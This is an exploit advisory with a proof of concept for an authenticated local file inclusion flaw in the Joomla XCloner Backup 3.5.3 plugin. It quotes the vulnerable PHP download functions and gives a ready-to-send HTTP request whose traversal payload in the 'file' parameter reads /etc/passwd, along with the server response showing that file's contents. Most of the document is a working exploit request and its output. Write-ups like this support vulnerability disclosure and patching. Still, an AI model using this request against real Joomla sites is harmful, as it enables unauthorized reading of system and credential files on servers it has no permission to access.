Exploit Title: Joomla! Plugin XCloner Backup 3.5.3 - Local File Inclusion (Authenticated)<br>
Date: 2020-05-10<br>
Exploit Author: Mehmet Kelepçe / Gais Cyber Security<br>
Exploit-Db Author ID: 8763<br>
Reference: https://www.xcloner.com/xcloner-news/security-release-available-for-archived-joomla-version/<br>
Vendor Homepage: http://www.xcloner.com<br>
Software Link: https://www.xcloner.com/support/download/<br>
Version: 3.5.3<br>
Tested on: Kali Linux - Apache2<br>
<br>
Detail:<br>
<br>
File: administrator/components/com_xcloner-backupandstore/admin.cloner.php<br>
-<br>
case 'download':<br>
 downloadBackup($_REQUEST['file']);<br>
 break;<br>
-<br>
<br>
downloadBackup function's file -> administrator/components/com_xcloner-backupandstore/cloner.functions.php<br>
Vulnerable parameter: file<br>
<br>
downloadBackup function's definition<br>
-<br>
  function downloadBackup($file)<br>
  {<br>
      global $_CONFIG;<br>
<br>
      $file = realpath($_CONFIG['clonerPath'] . "/$file");
<br>
      //First, see if the file exists<br>
      if (!is_file($file)) {<br>
          die("<b>404 File $file was not found!</b>");<br>
      }<br>
<br>
      //File Info<br>
      $len = get_filesize($file);<br>
      $filename = basename($file);<br>
      $file_extension = strtolower(substr(strrchr($filename, "."), 1));<br>
<br>
      //Setam Content-Type-urile pentru  fisierul in cauza<br>
      switch ($file_extension) {<br>
          default:<br>
              $ctype = "application/force-download";<br>
      }<br>
<br>
 smartReadFile($file, $filename);<br>
<br>
      exit;<br>
  }<br>
-<br>
and smartReadFile function's definition<br>
-<br>
function smartReadFile($location, $filename, $mimeType='application/octet-stream')<br>
{ if(!file_exists($location))<br>
  { header ("HTTP/1.0 404 Not Found");<br>
    return;<br>
  }<br>
<br>
  $size=filesize($location);<br>
  $time=date('r',filemtime($location));<br>
<br>
  $fm=@fopen($location,'r');<br>
.<br>
.<br>
.<br>
-<br>
PoC:<br>
Request:<br>
-<br>
GET /joomla/administrator/index.php?option=com_xcloner-backupandrestore&task=download&file=../../../../../../../../etc/passwd HTTP/1.1<br>
Host: localhost<br>
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0<br>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<br>
Accept-Language: en-US,en;q=0.5<br>
Accept-Encoding: gzip, deflate<br>
Referer: http://localhost/joomla/administrator/index.php?option=com_xcloner-backupandrestore&task=view<br>
Connection: close<br>
Cookie: COOKIES<br>
Upgrade-Insecure-Requests: 1<br>
-<br>
Response:<br>
-<br>
HTTP/1.0 200 OK<br>
Date: Sun, 10 May 2020 18:12:04 GMT<br>
Server: Apache/2.4.41 (Debian)<br>
Cache-Control: public, must-revalidate, max-age=0<br>
Pragma: no-cache<br>
Accept-Ranges: bytes<br>
Content-Length: 3347<br>
Content-Range: bytes 0-3347/3347<br>
Content-Disposition: inline; filename=passwd<br>
Content-Transfer-Encoding: binary<br>
Last-Modified: Sun, 22 Mar 2020 05:41:35 -0700<br>
Connection: close<br>
Content-Type: application/octet-stream<br>
<br>
root:x:0:0:root:/root:/bin/bash<br>
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin<br>
bin:x:2:2:bin:/bin:/usr/sbin/nologin<br>
sys:x:3:3:sys:/dev:/usr/sbin/nologin<br>
sync:x:4:65534:sync:/bin:/bin/sync<br>
.<br>
.<br>
